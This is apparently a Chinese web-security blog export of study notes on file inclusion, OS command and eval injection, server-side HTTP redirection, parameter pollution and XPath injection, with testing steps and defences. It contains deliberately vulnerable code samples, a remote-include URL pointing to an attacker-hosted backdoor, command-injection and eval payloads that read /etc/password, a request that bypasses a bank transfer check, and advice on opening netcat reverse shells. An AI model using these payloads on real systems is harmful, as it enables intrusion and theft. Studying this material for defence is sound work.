<p>这使执行环境加载位于Web服务器文件系统中的US.php文件。然后，这个文件的内容被复制到main.php中并得以执行。</p>
<p>攻击者能够以各种方式利用这种行为，最严重的情况是指定一个外部URL作为包含文件的位置。PHP包含函数接受这个位置作为输入，接着，执行环境将获取指定的文件并制定其内容。因此，攻击者能够构建一个包含任意复杂内容的恶意脚本，将其及存在他控制的Web服务器上，并通过易受攻击的应用程序函数调用它然后执行。例如：</p>
<p><strong><a href="https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor" target="_blank" rel="noopener">https://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor</a></strong></p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>有时，应用程序根据用户可控制的数据加载包含文件，但这是不可能给位于外部服务器上的文件制定URL。例如，用户可控制的数据被提交给ASP函数Server.execute，那么攻击者就可以执行任意一段ASP脚本，只要这段脚本属于调用这个函数的相同应用程序。</p>
<p>在这种情况下，攻击者仍然可以利用应用程序的行为执行未授权的操作。</p>
<ul>
<li>在服务器上可能有一些通过正常途径无法访问的路径，例如，任何访问路径/admin的请求都会被应用程序实施的访问控制阻止。如果能够将敏感功能包含在一个授权访问的页面中，那么就可以访问那个功能。</li>
<li>服务器上的一些静态资源也受到同样的保护，无法直接访问。如果能够将这些文件攻台包含在其他应用程序页面中，那么执行环境就会将静态资源的内容复制到它的响应中。</li>
</ul>
<h2 id="查找文件包含漏洞"><a href="#查找文件包含漏洞" class="headerlink" title="查找文件包含漏洞"></a>查找文件包含漏洞</h2><p>任何用户提交的数据项都可能因此文件包含漏洞。它们经常出现在指定一种语言或一个位置的请求参数中，也常常发生在以参数形式传送服务器端文件名的情况下。</p>
<p>要测试远程文件包含漏洞，执行以下步骤：</p>
<ol>
<li>向每一个目标参数提交一个连接受控制的Web服务器资源的URL，并确定是否收到运行目标应用程序的服务器提出任何请求。</li>
<li>如果第一次测试失败，尝试提交一个包含不存在的IP地址的URL，并确定服务器视图与这个地址建立连接时是否出现超时。</li>
<li>如果发现应用程序易于受到远程文件包含攻击，与前面描述的动态执行攻击中一样，使用相关语言中的可用API，弓箭一段恶意脚本实施攻击。</li>
</ol>
<p>相对于远程文件包含而言，存在本地文件包含漏洞的脚本环境要多一些。要测试本地文件包含漏洞，执行以下步骤：</p>
<ol>
<li>提交服务器上一个已知可执行资源的名称，确定应用程序的行为是否有任何变化</li>
<li>提交服务器上一个已知静态资源的名称，确定它的内容是否被复制到应用程序的响应中。</li>
<li>如果应用程序易于受到本地文件包含攻击，尝试通过Web服务器访问任何无法直接到达的敏感功能或资源</li>
<li>测试能够利用之前讲到的遍历技巧访问其他目录中的文件。</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>文件路径</tag>
      </tags>
  </entry>
  <entry>
    <title>注入操作系统命令</title>
    <url>/2019/03/26/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-1-%E6%B3%A8%E5%85%A5OS%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="注入操作系统命令"><a href="#注入操作系统命令" class="headerlink" title="注入操作系统命令"></a>注入操作系统命令</h1><p>大多数Web服务器平台发展迅速，现在它们已经能够使用内置的API与服务器的操作系统进行几乎任何必须的交互。如果正确使用，这些API可帮助开发者访问文件系统、连接其他进程、进行安全的网络通信。但是，许多时候，开发者选择使用更高级的技术直接向服务器发送操作系统的命令。由于这些技术功能强大、操作简单，并且通常能够立即解决特定的问题，因而具有很强的吸引力。但是，如果应用程序向操作系统命令传送用户提交的输入，那么就可能会受到命令注入攻击，由此攻击者能够提交专门设计的输入，修改开发者想要执行的命令。</p>
<p>长用户发出操作系统命令的函数，如PHP中的exec和ASP中的wscript.shell函数，通常并不限制命令的可执行范围。即使开发者准备使用API执行相对善意的任务，例如，列出目录的内容，攻击者还是可以对其进行暗中破坏，从而写入任意文件或启动其他程序。通常，所有的注入命令都可在Web服务器的进程中安全运行，它具有足够强大的功能，使得攻击者能够完全控制整个服务器。</p>
<p>许多非定制和定制Web应用程序中都存在这种命令注入缺陷。在为企业服务器或防火墙、打印机和路由器之类的设备提供管理界面的应用程序中，这种缺陷尤为普遍。通常，由于这类程序由于操作系统交互的特殊需求，导致开发者直接使用合并了用户提交的数据的系统命令。</p>
<h2 id="通过Perl注入"><a href="#通过Perl注入" class="headerlink" title="通过Perl注入"></a>通过Perl注入</h2><p>以下面的Perl CGI代码为例，它是一个用于服务器管理的Web应用程序代码的一部分。这项功能允许管理员在服务器上指定一个目录，并查看它的磁盘使用情况：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> CGI <span class="string">qw(:standard escapeHTML)</span></span><br><span class="line"><span class="keyword">print</span> header, start_html(<span class="string">""</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="string">"&lt;pre&gt;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $command = <span class="string">"du -h --exclude php* /var/www/html"</span></span><br><span class="line">$command=$command.param(<span class="string">"dir"</span>);</span><br><span class="line">$command=<span class="string">`$command`</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$command\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> end_html;</span><br></pre></td></tr></table></figure>

<p>如果按设想的方式运行，这段脚本将把用户提交的dir参数值附加在预先设定的命令后面，执行命令并显示结果。</p>
<p>然而，通过提交专门设计的、包含shell元字符的输入，攻击者可对这项功能进行各种方式的利用。对处理命令的解释器而言，这些字符有着特殊的含义，并可破坏开发者想要执行的命令。例如，管道符“|”可用于将一个进程的输入重定向为另一个进程的输入，从而将几个命令连接在一起。攻击者可以利用这种行为注入另外一个命令并获得输出结果。</p>
<h2 id="通过ASP注入"><a href="#通过ASP注入" class="headerlink" title="通过ASP注入"></a>通过ASP注入</h2><p>以下面的C#代码为例，它是一个用于管理Web服务器的Web应用程序代码部分。该功能允许管理员查看被请求的目录和内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String dirName &#x3D; &quot;C:\\filestore\\&quot; + Directory.Text;</span><br><span class="line">ProcessStartInfo psInfo &#x3D; new ProcessStartInfo(&quot;cmd&quot;, &quot;&#x2F;c dir &quot; + dirName);</span><br><span class="line">...</span><br><span class="line">Process proc &#x3D; Process.Start(psInfo);</span><br></pre></td></tr></table></figure>

<p>如果按设想的方式运行，这段脚本将把用户提交的Directory参数值插入到预先设定的命令中，执行命令并显示结果。</p>
<p>和前面易受攻击的Perl脚本一样，攻击者可以使用shell元字符破坏开发者预先设定的命令，并注入他自己的命令。&amp;字符用于将几个命令组合在一起。提交一个包含&amp;字符的文件名和另外一个命令就可以执行该命令并显示器结果。</p>
<h2 id="通过动态执行注入"><a href="#通过动态执行注入" class="headerlink" title="通过动态执行注入"></a>通过动态执行注入</h2><p>许多Web脚本语言支持动态执行在运行时生成的代码。这种特性允许开发者创建可根据各种数据和条件攻台修改其代码的应用程序。如果用户输入合并到可动态执行的代码中，那么攻击者就可以提交专门设计的输入，破坏原有数据，指定服务器执行自己的命令，就好像这些命令是由最初开发者编写的一样。这时，攻击者的第一个目标通常是注入运行操作系统命令的API。</p>
<p>PHP函数eval可用于动态执行在运行时传送给该函数的代码。下面以一个搜索功能为例，该动能允许用户创建保存的搜索，然后在用户界面上以链接的形式丰台生成这些搜索。用户使用下面的URL访问该搜索功能：</p>
<p><strong>/search.php?storedsearch=\$mysearch%3dwahh</strong></p>
<p>服务器端应用程序通过动态生成变量来执行这项功能，生成的变量包含在storedsearch参数中指定的名/值对；此处，它创建值为wahh的变量mysearch。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$storedsearch = $_GET[<span class="string">'storedsearch'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"$storedsearch"</span>);</span><br></pre></td></tr></table></figure>

<p>这时，就可以提交专门设计的输入，由eval函数动态执行，从而在服务器端应用程序中注入任意PHP命令。分号字符可用于在单独一个参数中将几个命令连接在一起。例如，要检索文件/etc/password,keyi shiyong file_get_contents命令或system命令：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/search.php?storedsearch=\$mysearch%<span class="number">3</span>dwahh;%<span class="number">20</span><span class="keyword">echo</span>%<span class="number">20</span>file_get_contents(<span class="string">'/etc/password'</span>)</span><br><span class="line">/search.php?storedsearch=\$mysearch%<span class="number">3</span>dwahh;%<span class="number">20</span><span class="keyword">echo</span>%<span class="number">20</span>file_get_contents(<span class="string">'cat%20/etc/password'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="查找OS命令注入漏洞"><a href="#查找OS命令注入漏洞" class="headerlink" title="查找OS命令注入漏洞"></a>查找OS命令注入漏洞</h2><p>不同的命令解释器处理shell元字符的方式各不相同。理论上，任何类型的应用程序开发平台或Web服务器可能会调用任何shell解释器，在它自己或任何其他主机的操作系统上运行。因此，不应根据对Web服务器操作系统的了解，对应用程序如何处理元数据做出任何假设。</p>
<p>有两种类型的元字符可用于在一个现有的预先设定的命令中注入一个独立的命令。</p>
<ul>
<li>字符 ; | &amp; 和换行符可用于将几个命令逐个连接在一起。有些时候，可以承兑使用这些字符以达到不同的效果。例如，在Windows命令解释器中，使用&amp;&amp;则第二个命令只有在第一个命令成功执行后才会运行。使用 ||  则总运行第二个命令，无论第一个命令是否成功执行。</li>
<li>反引号（`）用于讲一个独立的命令包含在最初的命令处理的数据中。把一个注入的命令放在反引号内shell解释器就会执行该命令，并用这个命令的结果代替被包含的文本，然后继续执行得到的命令字符串。</li>
</ul>
<p>通常，检测命令注入是否可行的最可靠方法就是使用时间延迟推断，类似于前面描述的利用盲目SQL注入时使用的方法。如果一个潜在的漏洞可能存在，那么就可以使用其他方法确定这个漏洞，并获得注入命令的执行结果。</p>
<ol>
<li><p>通常可以使用PING命令让服务器在一段时间内检测它的回环接口，从而触发时间延迟。Windows和Unix平台在处理命令分隔符与PING命令方面存在一些细微的差别，但是，如果没有设置过滤，下面的通用测试字符串应该能够在两个平台上引起30秒的时间延迟。</p>
<p><strong>|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &amp;</strong></p>
<p>如果应用程序过滤掉某些命令的分隔符，为加大监测到命令注入漏洞的可能性，还应轮流向每一个目标参数提交下面的每个测试字符串，并监控应用程序进行响应的时间。</p>
<p><strong>| ping -i 30 127.0.0.1 |</strong></p>
<p><strong>| ping -n 30 127.0.0.1 |</strong></p>
<p><strong>&amp; ping -i 30 127.0.0.1 &amp;</strong></p>
<p><strong>&amp; ping -n 30 127.0.0.1 &amp;</strong></p>
<p><strong>; ping -i 30 127.0.0.1 ;</strong></p>
<p><strong>%0a ping -i 30 127.0.0.1 %0a</strong></p>
<p><strong>‘ ping 127.0.0.1 ‘</strong></p>
</li>
<li><p>如果发生时间延迟，说明应用程序可能易于受到命令注入攻击。重复几次测试过程，确定延迟不是由于网络延时或其他异常造成的。可以尝试更改-n或-i的参数的值，并确定经历的时间延迟是否会随着提交的值发生对应的变化。</p>
</li>
<li><p>使用所发现的任何一个可成功实施攻击的注入字符串，尝试注入另一个更有用的命令（如ls或dir），确定是否能够将命令结果返回到浏览器上。</p>
</li>
<li><p>如果不能直接获得命令执行结果，还可以采用其他方法：</p>
<ul>
<li>可以尝试打开一条通向自己计算机的带外通道。尝试使用TFTP上传工具至服务器，使用telnet或netcat建立一个通向自己计算机的反向shell，并使用main命令通过SMTP发送命令结果。</li>
<li>可以将命令结果重定向到Web根目录下的一个文件，然后使用浏览器直接获取结果。</li>
</ul>
<p><strong>dir &gt; C:\inetpub\wwwroot\foo.txt</strong></p>
</li>
</ol>
<p>有时，由于某些字符被过滤掉，或者应用程序所使用的的命令的API的特殊行为，可能无法注入一个完全独立的命令。但是，攻击者仍然可以破坏所执行的命令的行为，得到想要的结果。</p>
<h2 id="查找动态执行漏洞"><a href="#查找动态执行漏洞" class="headerlink" title="查找动态执行漏洞"></a>查找动态执行漏洞</h2><p>动态执行漏洞最常见于PHP和Perl等语言。但基本上，任何应用程序平台都可能会向基于脚本的解释器传送用户提交的输入。</p>
<ol>
<li>用户提交的所有数据项都可提交给动态执行函数。其中最常见的数据项是cookie参数名称和参数值，以及作为前一项操作结果保存在用户资料中的永久数据。</li>
<li>尝试轮流项目表参数提交下列值：</li>
</ol>
<ul>
<li><strong>;echo%20111111</strong></li>
<li><strong>echo%201111111</strong></li>
<li><strong>response.write%20111111</strong></li>
<li><strong>:response.write%20111111</strong></li>
</ul>
<ol start="3">
<li>监控应用程序的响应。如果字符串111111被单独返回，就表示应用程序可能易于受到脚本命令注入。</li>
<li>如果字符串111111并未返回，寻找任何表示输入被动态执行的错误消息；另外，可能需要对语法进行调整，以实现注入任意命令的目的。</li>
<li>如果攻击的应用程序使用PHP，可以使用测试字符串phpinfo()。如果它成功执行，应用程序将返回PHP环境的配置信息。</li>
<li>如果应用程序可能易于受到攻击，与前面描述的查找OS命令注入漏洞时一样，注入一些造成时间延迟的命令确认这一点。例如：</li>
</ol>
<p><strong>system(‘ping%20127.0.0.1’)</strong></p>
<h2 id="防止OS命令注入"><a href="#防止OS命令注入" class="headerlink" title="防止OS命令注入"></a>防止OS命令注入</h2><p>通常来说，防止OS命令注入漏洞的最佳方法是完全避免直接调用操作系统命令。几乎Web应用程序所需要执行的每个任务都可以使用内置API完成，而且攻击者无法控制这些API，使其执行其他预料之外的命令。</p>
<p>如果无法避免要在传送给操作系统命令解释器的命令字符串中插入用户提交的数据，应用程序应实施严格的防御来防止漏洞发生。如果可能，应使用一份“白名单”限制用户只输入一组特殊的值。或者，应将输入范围限制为少数字符，例如，仅字母数字字符。应拒绝包含任何其他数据（包含任何元字符或空白符）的输入。</p>
<p>应用程序应使用命令API通过它的名称和命令行参数启动特殊的进程，而不是想支持命令链接与重定向的shell解释器传送命令字符串，从而实施另一层保护。</p>
<h2 id="防止脚本注入漏洞"><a href="#防止脚本注入漏洞" class="headerlink" title="防止脚本注入漏洞"></a>防止脚本注入漏洞</h2><p>通常而言，防止脚本注入漏洞的最佳方法是，避免将用户提交的输入或者来自用户的数据传送给任何动态执行或包含函数。如果由于某种原因必须传送用户提交的输入，那么应对相关输入进行严格的确认检查以组织任何攻击。如有可能，使用一份由已知可靠的值组成的“白名单”，并拒绝任何没有出现在这个名单上的输入。如果无法做到这一点，应根据一组已知无害的字符[如字母数字字符（空白符除外）]检查再输入中使用的字符。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>操作系统命令</tag>
      </tags>
  </entry>
  <entry>
    <title>注入后端HTTP请求</title>
    <url>/2019/03/26/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/5-4-%E6%B3%A8%E5%85%A5%E5%90%8E%E7%AB%AFHTTP%E8%AF%B7%E6%B1%82/</url>
    <content><![CDATA[<h1 id="注入HTTP后端请求"><a href="#注入HTTP后端请求" class="headerlink" title="注入HTTP后端请求"></a>注入HTTP后端请求</h1><p>影城程序可能会将用户输入嵌入任何类型的后端HTTP请求，包括哪些以常规名/值对传输参数的请求。由于应用程序通常会有效代理用户提交的UTL和参数，因而这种行为往往易于受到攻击。针对这种功能的攻击可以分为以下类别：</p>
<ul>
<li>服务端HTTP重新向：攻击者可以通过这种方式制定任意资源或URL，然后再由后端应用父亲为请求这些资源或URL。</li>
<li>HTTP参数注入（HPI）：攻击者可以通过这种方法在应用程序服务器提出的后端HTTP请求中注入任意参数。如果攻击者注入后端请求中已存在的参数，就可以利用HTTP参数污染（HPP）攻击覆盖服务器指定的原始参数值。</li>
</ul>
<h2 id="服务器HTTP重定向"><a href="#服务器HTTP重定向" class="headerlink" title="服务器HTTP重定向"></a>服务器HTTP重定向</h2><p>如果应用程序接受用户可控制的输入，并将其合并到使用后端HTTP请求检索的URL中，这种行为就会导致服务器端重定向漏洞。用户提交的输入中可能包含被检索的完整URL，或者应用程序可能会对该URL进行某种处理，如添加标准的后缀。</p>
<p>后端HTTP请求可能指定公公因特网上的某个域，或者指定用户无法直接访问的内部服务器。所请求的内容可能对应用程序的功能非常关键，如支付网关的接口；或者较为次要，如从第三方提取的内容。这种技巧常用于将几个单独的内部和外部应用程序组件结合到一个前端应用程序中，再由该应用程序代表这些组件实施访问控制和会话管理。如果攻击者能够控制后端HTTP请求中的IP地址或主机名，他就可以使应用程序服务器连接到任意资源，有时甚至能够检索后端响应的内容。</p>
<p>以下面的前端请求为例，其中的loc参数用于指定客户端希望查看的CSS文件的版本：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /account/home HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: wahh-blogs.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">view=default&amp;loc=online.wahh-blogs.net/css/wahh.css</span><br></pre></td></tr></table></figure>

<p>如果没有在loc参数中未URL指定确认机制，攻击者就可以指定任何主机名来替代online.wahh-blogs.net。应用陈故乡将检索指定的资源，导致攻击者将应用程序用作潜在的敏感后端服务的代理服务器。在下面的示例中，攻击者使应用程序连接到后端的SSH服务：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /account/home HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Host: wahh-blogs.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">view=default&amp;loc=192.168.0.1:22</span><br></pre></td></tr></table></figure>

<p>应用程序的响应包含所请求的SSH服务 的旗标：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">SSH-2.0-OpenSSH_4.2Protocol mismatch.</span><br></pre></td></tr></table></figure>

<p>攻击者可以利用服务器端HTTP重定向漏洞，将易受攻击的应用程序作为开放的HTTP代理服务器，以事实各种其他攻击。</p>
<ul>
<li>攻击者可以将该代理服务器用于攻击互联网上的第三方系统。恶意流量针对的是运行易受攻击的应用程序的服务器上的目标。</li>
<li>攻击者可以将该代理服务器用于连接到阻止内部网络中的任意主机，从而访问无法通过因特网直接访问的目标</li>
<li>攻击者可以将该代理服务器用于反向连接在应用程序服务器本身上运行的其他服务，从而突破防火墙限制，并利用新人关系来避开身份验证。</li>
<li>最后，攻击者可以通过使应用程序在响应中包含受控的内容，利用代理功能实现跨站点脚本等攻击。</li>
</ul>
<p>测试步骤：</p>
<ol>
<li>确定任何可能包含主机名、IP地址或完整URL的请求参数</li>
<li>对于每个参数，修改参数值以指定其他与所请求的资源类似的资源，并观察该资源是否会出现在服务器的响应中。</li>
<li>尝试指定一个针对你控制的额因特网服务器URL，并对该服务器进行监视，检查来自所测试的应用程序的传入连接。</li>
<li>如果没有收到任何传入连接，则监视应用程序响应所花费的时间。如果存在延迟，则说明应用程序的祸端请求可能由于出站连接上的网络限制导致超时。</li>
<li>如果成功利用相关功能连接到任意URL，则可以尝试实施以下攻击。<ol>
<li>确定是否可以制定端口号，例如，可以指定<a href="http://mdattacker.net:22" target="_blank" rel="noopener">http://mdattacker.net:22</a></li>
<li>如果可以指定端口号，尝试使用Burp Intruder等工具对内部网络进行端口扫描，以逐个连接到一系列IP地址和端口</li>
<li>尝试连接到应用程序服务器的回环地址上的其他服务，</li>
<li>尝试将受控的Web页面加载到应用程序的响应中，以实施跨站点脚本攻击。</li>
</ol>
</li>
</ol>
<h2 id="HTTP参数注入"><a href="#HTTP参数注入" class="headerlink" title="HTTP参数注入"></a>HTTP参数注入</h2><p>如果用户提交的参数被用作后端HTTP请求中的参数，这时就会导致HTTP参数注入。以下面的之前易于收SOAP注入的银行转账功能为例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/48/Default.aspx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAccount=08447656&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<p>这个前端请求由用户的浏览器提出，将导致应用程序向银行基础架构中的另一台Web服务器提出其他HTTP请求。在以下后端请求中，应用程序从前端请求中复制了一些参数值：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAcc=08447656</span><br></pre></td></tr></table></figure>

<p>这个请求要求后端服务器检查时候有清算资金可以转账，如果有，则进行转账。但是，前端服务器可以通过提供以下参数，指定存在清算资金，从而避开上述检查：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ClearedFunds=true</span><br></pre></td></tr></table></figure>

<p>如果攻击者发现这种行为，他就可以尝试实施HPI攻击，在后端请求中注入ClearedFunds参数。要注入该参数，他将所需参数附加到现有参数值的后面，并将分隔名称和值的&amp;和=字符进行URL编码，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /bank/48/Default.aspx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Content-Length: 65</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAccount=08447656%26clearedFunds%3dtrue&amp;Submit=Submit</span><br></pre></td></tr></table></figure>

<p>当应用服务器处理这个请求时，它会以正常方式对参数值进行URL解码。因此，前端应用程序受到的ToAccount参数值位</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">08447656&amp;ClearedFunds=true</span><br></pre></td></tr></table></figure>

<p>如果前端应用程序没有确认这个值并将它按原样传递给后端请求，应用程序将提出以下后端请求，使攻击者能工成功避开清算资金检查。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 44</span><br><span class="line"></span><br><span class="line">FromAccount=18281008&amp;Amount=1430&amp;ToAcc=08447656&amp;ClearedFunds=true</span><br></pre></td></tr></table></figure>

<h3 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h3><p>HPP是一种可用于各种环境下的攻击机巧，这种技巧常用在HPI攻击中。</p>
<p>如果请求中包含多个同名请求，这时Web服务器该如何处理？对于这一问题，HTTP规范并未提供任何指导。实际上，各种Web服务器的处理方式各不相同，以下是一些常见的处理方式。</p>
<ul>
<li>使用参数的第一个实例</li>
<li>使用参数的最后一个实例</li>
<li>串联参数值，可能在参数之间添加分隔符</li>
<li>构建一个包含所有请求值的数组</li>
</ul>
<p>在前面的HPI示例中，攻击者可以在后端请求中添加一个新的参数。实际上，攻击者可以对其实施注入攻击的请求很可能已经包含一个与攻击者所针对的参数同名的参数。在这种情况下，攻击者可以使用HPI条件注入另一个同名参数。随后，应用程序将表现出何种行为，将取决于后端HTTP服务器如何处理重复的参数。这样，攻击者获取可以用他注入的参数值“覆盖”原始参数值。</p>
<p>例如，如果原始的后端请求为：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">fromacc=18281008&amp;amount=1430&amp;clearedFunds=false&amp;toacc=08447656</span><br></pre></td></tr></table></figure>

<p>并且后端服务器使用任何重复的参数的第一个实例，则攻击者可以对前端请求中的FromAccount参数实施攻击，如下所示：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">POST /doTransfer.asp HTTP/1.0</span><br><span class="line">Host: mdsec-mgr.int.mdsec.net</span><br><span class="line">Content-Length: 62</span><br><span class="line"></span><br><span class="line">FromAccount=18281008%26clearedFunds%3dtrue&amp;Amount=1430&amp;ToAccount=08447656</span><br></pre></td></tr></table></figure>

<p>相反，在这个示例中，如果后端服务器使用任何重复的参数的最后一个实例，则攻击者可以对前端请求中的ToAccount参数实施攻击。</p>
<p>HPP能否攻击成功，在很大程度上取决于目标应用服务器如何处理多个同名参数，以及后端请求中的插入点是否准确。如果两种技术需要处理相同的HTTP请求，HPP攻击就会造成严重的后果。Web应用程序防火墙或反向代理可能会处理某个请求，并将其传递给Web应用程序，由Web应用程序抛弃变量，甚至是基于之前不想管的请求部分构件字符串。</p>
<h3 id="攻击URL转换"><a href="#攻击URL转换" class="headerlink" title="攻击URL转换"></a>攻击URL转换</h3><p>许多服务器会在所请求的URL抵达时重写这些URL，再将它们映射到应用程序中的相关后端功能。除传统的URL重写外，服务器在处理REST风格的参数、定制导航包装器以及其他URL转换方法时都会进行URL重写。这种方式可能易受HPI和HPP攻击。</p>
<p>为了简化和便于导航，一些应用程序在URL的文件路径，而非查询字符串中插入参数值。通常，应用程序会通过一些简单的规则转换URL，然后将其转发给真正地目标。Apache中的以下mod_rewrite规则用于处理可公共访问的用户资料：</p>
<p><strong>RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /pub/user/[\&amp;]*\ HTTP/</strong></p>
<p><strong>RewriteRUle ^pub/user/([^/\\.]+)$ /inc/user_mgr.php?mode=view&amp;name=$1</strong></p>
<p>次规则接受非常简洁的请求，例如：</p>
<p><strong>/pub/user/marcus</strong></p>
<p>并将这些请求转换为后端请求，以便于用户管理页面user_mgr.php包含的view功能进行处理。例如，如果攻击者请求：</p>
<p><strong>/pub/user/marcus%26mode=edit</strong></p>
<p>将URL编码的值嵌入经过重写的URL中，将得到：</p>
<p><strong>/inc/user_mgr.php?mode=view&amp;name=marcus&amp;mode=edit</strong></p>
<p>讲HPP攻击的时候说到，这种攻击能否成功取决于服务器如何处理重复的参数。在PHP平台中，mode参数被视为具有值edit，因而攻击取得成功。</p>
<p>测试步骤：</p>
<ol>
<li><p>轮流针对每个请求参数进行测试，尝试使用各种语法添加一个心注入的参数：</p>
<ul>
<li>%26foo%3dbar——URL编码的&amp;foo=bar</li>
<li>%3bfoo%3dnar——URL编码的;foo=bar</li>
<li>%2526foo%253dbar——双重URL编码的&amp;foo=bar</li>
</ul>
</li>
<li><p>确定任何修改后不会改变应用程序的行为的参数示例（仅适用于在修改后会在应用程序的响应造成某种差异的参数）。</p>
</li>
<li><p>在上一步确定的每个实例都可以实施参数注入。尝试在请求的不同位置注入一个一致的参数，看这样做是否可以覆盖或修改现有的某个参数。例如：</p>
<p><strong>FromAccount=18281008%26Amount%3d4444&amp;Amount=1430&amp;ToAccount=08447656</strong></p>
</li>
<li><p>如果这样做会将现有值替换为心智，确定是否可以通过注入一个由后端服务器读取的值来避开任何前端确认机制。</p>
</li>
<li><p>用其他参数名称替换注入的已知参数。</p>
</li>
<li><p>测试应用程序是否允许在请求中多次提交同一个参数，在其他参数前后，以及请求的不同位置提交多余的值。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>HTTP请求</tag>
      </tags>
  </entry>
  <entry>
    <title>注入XPath</title>
    <url>/2019/03/25/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-4%E6%B3%A8%E5%85%A5XPath/</url>
    <content><![CDATA[<h1 id="注入XPath"><a href="#注入XPath" class="headerlink" title="注入XPath"></a>注入XPath</h1><p>XPath（XML路径语言）是一种利用与导航XML文档并从中获取数据的解释型语言。许多时候一个XPath表达式代表由一个文档节点导航到另一个文档节点所需要的一系列步骤。</p>
<p>如果Web应用程序将数据保存在XML文档中，那么它们可能使用XPath访问数据，以响应用户提交的输入。如果这个输入未经任何过滤或净化就插入到XPath查询中，攻击者就可以通过控制查询来破坏应用程序的逻辑，或者获取未授权访问的数据。</p>
<p>通常，XML文档并不是保存企业数据的首选工具。但是，它们常常被用于保存可根据用户输入获取的应用程序配置数据。小型应用程序也可使用它们保存简单的信息，如用户证书、角色和权限。以下面的XML数据为例：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">addressBook</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>William<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">surname</span>&gt;</span>Gates<span class="tag">&lt;/<span class="name">surname</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">password</span>&gt;</span>MSRocks!<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">email</span>&gt;</span>billyg@microsoft.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ccard</span>&gt;</span>5130 8190 3282 3515<span class="tag">&lt;/<span class="name">ccard</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">address</span>&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">firstName</span>&gt;</span>Chris<span class="tag">&lt;/<span class="name">firstName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">surname</span>&gt;</span>Dawes<span class="tag">&lt;/<span class="name">surname</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span 